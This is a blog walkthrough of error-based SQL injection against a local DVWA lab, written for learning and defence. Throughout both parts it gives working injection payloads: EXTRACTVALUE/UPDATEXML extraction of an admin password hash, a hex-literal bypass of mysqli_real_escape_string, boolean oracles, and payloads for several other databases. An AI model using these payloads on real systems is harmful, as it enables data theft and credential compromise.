---
layout: post
title: "Error-based SQL Injection on DVWA: getting the database to confess in its own error messages"
date: 2026-05-30
categories: [web-security, walkthrough]
tags: [sqli, error-based, dvwa, extractvalue, mariadb, burp-suite]
excerpt: "I sent one request with EXTRACTVALUE and the database printed the password hash inside its own error message. Then I moved to Medium level and spent ten minutes confused about why nothing was working — turns out I had two security cookies fighting each other."
---

The previous two sessions ended with credential dumps — one through UNION SELECT, one through 220 rounds of blind boolean extraction. UNION needed the output reflected in the page. Blind needed patience and Burp Intruder. This session is about a third technique: **error-based injection**, where you make the database generate an error whose text contains the data you want.

One request. Data inside the error message. Done.

The condition: the application must print database errors in the response. DVWA Low does exactly this — that `die(mysqli_error(...))` in the source code isn't just a vulnerability, it's a free exfiltration channel the developer built themselves.

---

## Part 1 — Low level: making the database betray itself

### When to use which technique

Before picking a tool, you need to know what the application gives you:

| What the app shows | Technique |
|--------------------|-----------|
| Query output reflected in page | UNION-based |
| Database errors reflected in page | Error-based |
| Only behavioral difference (exists/missing) | Blind boolean |
| Nothing at all | Blind time-based |

The selection order in practice: try UNION first, then error-based, then fall back to blind. Each step down costs more requests per byte of data extracted.

### Confirming injection — the three-step check

Before attempting any extraction, verify that injection is possible and that errors are visible. Three requests:

```
?id=1        → 200, normal user output           → baseline
?id=1'       → SQL syntax error in page          → injection point confirmed, errors visible
?id=1'--+    → 200, normal output again          → you control the SQL syntax
```

The third step is the one that matters: if `--+` neutralizes the error, the comment reached the SQL parser. You're in control.

### EXTRACTVALUE: the mechanism

`EXTRACTVALUE(xml, xpath)` is a MariaDB/MySQL function that reads a value from an XML document using an XPath expression. Legitimate use:

```sql
EXTRACTVALUE('<user><name>admin</name></user>', '/user/name')
-- returns: admin
```

The injection trick: if the XPath expression is invalid, the database raises an error — and includes the invalid expression in the error message. So if you build the XPath expression using a subquery, the database evaluates the subquery, tries to use the result as XPath, fails, and prints the result in the error.

```
?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))--+
```

Response:

```
XPATH syntax error: '~10.1.26-MariaDB-0+deb9u1'
```

The version string — inside an error message. `0x7e` is `~` in hex, used as a separator to make the output readable. Without it the data blends into the error text.

Replace `version()` with something more interesting:

```
?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+password+FROM+users+WHERE+user='admin')))--+
```

Response:

```
XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
```

Almost right — but the hash is 32 characters and only 31 are showing. This is a known limitation of `EXTRACTVALUE` on MariaDB: output is truncated at 31 characters. To get the last character, shift the window with `SUBSTRING`:

```
?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT+password+FROM+users+WHERE+user='admin'),31,32)))--+
```

Response:

```
XPATH syntax error: '~99'
```

Full hash: `5f4dcc3b5aa765d61d8327deb882cf99`. Two requests total, compared to the 220 the blind session needed for the same result.

`UPDATEXML` works identically and has the same 31-character limit:

```
?id=1'+AND+UPDATEXML(1,CONCAT(0x7e,(SELECT+version())),1)--+
```

### Conditional errors with CASE WHEN — and MariaDB's surprise

PortSwigger's materials describe a technique where you trigger a conditional error to create a blind oracle: `CASE WHEN (condition) THEN 1/0 ELSE 1 END`. If the condition is true, division by zero crashes the database. If false, it returns 1 normally.

On PostgreSQL and MSSQL, `1/0` raises a fatal error. I tried it on MariaDB:

```
?id=1'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+1/0+ELSE+1+END)--+
```

No error. The page returned empty — no user, no crash. MariaDB handles division by zero silently, returning NULL instead of raising an exception. The AND fails because NULL is not truthy, so no rows are returned.

Then `1=2`:

```
?id=1'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+1/0+ELSE+1+END)--+
```

User visible — ELSE returns 1, AND succeeds, rows come back.

The oracle is inverted from what I expected: **empty = condition true, user visible = condition false**. It works — but the underlying mechanism differs from PortSwigger's description. MariaDB isn't crashing, it's returning NULL. Worth knowing before you assume cross-database behavior.

### Error-based equivalents across databases

| Database | Function | Notes |
|----------|----------|-------|
| MySQL / MariaDB | `EXTRACTVALUE(1, CONCAT(0x7e, (payload)))` | 31-char limit |
| MySQL / MariaDB | `UPDATEXML(1, CONCAT(0x7e, (payload)), 1)` | 31-char limit |
| PostgreSQL | `CAST((payload) AS int)` | No char limit |
| MSSQL | `CONVERT(int, (payload))` | Error includes the value |
| Oracle | `CTXSYS.DRITHSX.SN(1, (payload))` | Requires specific privileges |

The pattern is the same everywhere: find a function that evaluates an expression and includes it in the error message when it fails. The specific function changes, the database stays the unwilling accomplice.

---

**Low level done. Two requests, full credential dump, database broken by its own error handler. At this point I felt fairly clever.**

**So I switched to Medium level, fired the same payload, and everything kept working perfectly. Suspiciously perfectly.**

**Turns out I was still on Low. The page said Medium. The cookie said otherwise.**

---

## Part 2 — Medium level: same technique, harder to reach

### The cookie that kept lying to me

Switching DVWA from Low to Medium should be straightforward: DVWA Security → set Medium → save. Except for ten minutes nothing worked the way I expected — errors were different, the form still looked like Low's text field, and the security level in the page footer said `low`.

The culprit was in the cookie header:

```
Cookie: security=low; PHPSESSID=...; security=medium
```

Two `security` values. The browser was sending the old `security=low` cookie alongside the new `security=medium` one, and the server was picking up the first. Burp was intercepting requests that looked like Medium but were still executing as Low.

Fix: clear all DVWA cookies, log in fresh, set Medium, start a new intercept. After that the footer correctly showed `Security Level: medium` and the form had changed to a `<select>` dropdown with values 1–5.

Ten minutes lost to a duplicate cookie. This is fine. This is what security research looks like.

### The dropdown is not a defense

Medium replaces the text input with a `<select>` element offering only values 1 through 5. The intention is to limit what the user can submit. The problem: the `<select>` is enforced only in the browser. The server accepts whatever the POST body contains.

In Burp Repeater, you change `id=1` to `id=anything` regardless of what the dropdown offers. Client-side input restrictions are not a security control. They are a suggestion.

### Discovering injection without seeing the source code

On Medium you don't know in advance whether the input uses quotes or not. The approach: probe both contexts and read the behavior.

**`id=1'` via POST:**

```
You have an error in your SQL syntax... near '\''
```

The error shows `\'` — the quote was escaped by `mysqli_real_escape_string()`. String-based injection with quotes: blocked.

**`id=1 AND 1=1--+` via POST:** user visible.

**`id=1 AND 1=2--+` via POST:** page empty.

Two different behaviors. Injection confirmed in integer context — no quotes needed.

You can deduce the context without seeing the source: if `intval()` had been applied, `1 AND 1=1` would have been truncated to `1` and both conditions would have returned the same result. They didn't — so the input reached the SQL parser intact and unquoted.

### Why `mysqli_real_escape_string()` fails here

The Medium source code does this:

```php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_POST['id']);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

`$id` is not inside quotes in the query. `mysqli_real_escape_string()` escapes characters that are dangerous inside a quoted string — but there is no quoted string. The input lands directly in the SQL as a bare integer. Escaping quotes on an unquoted integer is like putting a lock on a door with no walls.

### Error-based on Medium — and the hex bypass

`EXTRACTVALUE` works the same way on Medium, just without quotes in the injection itself:

```
id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--+&Submit=Submit
```

Response:

```
XPATH syntax error: '~10.1.26-MariaDB-0+deb9u1'
```

But extracting a specific user's password requires a string comparison: `WHERE user='admin'`. On Medium, that quote gets escaped to `WHERE user=\'admin\'` — broken.

The bypass: hex encoding instead of string literals. `'admin'` in ASCII hex is `0x61646d696e`. MariaDB decodes it automatically, no quotes required:

```
id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE user=0x61646d696e)))--+&Submit=Submit
```

Response:

```
XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
```

Same hash. Zero quotes. `mysqli_real_escape_string()` had nothing to work with.

To convert strings to hex in Burp: **Decoder tab** → paste the string → **Encode as... → ASCII hex** → prepend `0x`.

### Conditional rendering with hex

The same boolean oracle from the blind session works here, adapted for integer context and hex encoding:

```
id=1 AND SUBSTRING((SELECT password FROM users WHERE user=0x61646d696e),1,1)=0x35--+&Submit=Submit
```

- `0x61646d696e` = `admin`
- `0x35` = `5`

Response: user visible. First character confirmed `5`. Page shown vs page empty is the oracle — same blind boolean concept, but routed through a context where quotes are blocked and hex is the workaround.

## Takeaways

- **Error-based is faster than blind when errors are visible.** Two requests to extract a 32-character hash vs 220. Verbose error handling is the attacker's best friend.
- **The 31-character limit in `EXTRACTVALUE` is real.** Use `SUBSTRING` to shift the window and recover truncated output.
- **`mysqli_real_escape_string()` on an unquoted integer is useless.** No string context, nothing to escape.
- **Hex encoding bypasses quote-based filters.** `0x61646d696e` is `admin` without a single quote in sight.
- **Client-side input restrictions are not security controls.** A `<select>` dropdown stops a casual user. Burp ignores it completely.
- **Cookie conflicts can silently break your test environment.** Check what security level the server is actually receiving, not what you think you set.

## Useful references

- [PortSwigger — SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- [PayloadsAllTheThings — Error-based injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#error-based-injection)
- [MariaDB — EXTRACTVALUE](https://mariadb.com/kb/en/extractvalue/)

---

*All techniques shown were performed on an isolated lab environment running in Docker on my local machine. Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
